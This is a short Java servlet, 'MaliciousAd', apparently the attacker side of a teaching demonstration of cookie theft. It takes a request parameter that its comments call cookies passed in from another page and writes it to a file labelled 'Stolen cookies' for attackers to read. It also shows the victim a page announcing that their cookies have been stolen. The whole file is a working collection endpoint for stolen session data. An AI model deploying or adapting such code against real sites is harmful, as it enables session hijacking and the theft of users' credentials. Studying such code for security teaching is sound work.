import java.io.IOException;
import java.io.PrintWriter;
import java.io.FileWriter;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/*
 * Write the cookies passed in into a file which 
 * can be accessed by malicious attackers.
 */
public class MaliciousAd extends HttpServlet {
	
	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse res) throws IOException {
    	//store the cookies passed in by WelcomePage.java 
		String name = req.getParameter("username");
		PrintWriter content = res.getWriter();
		//print something pointless to the webpage
		content.println("<h1>This is a trap!<h1>");
		content.print("<h2>Your cookies have been stolen!<h2>");
		//write the cookies into a file named Cookies
		FileWriter fileWriter = new FileWriter("Cookies");
		PrintWriter printWriter = new PrintWriter(fileWriter);
		printWriter.print("Stolen cookies:\n"); 
		printWriter.print(name);
        //close the file after writing is complete
		printWriter.close();
	}
}
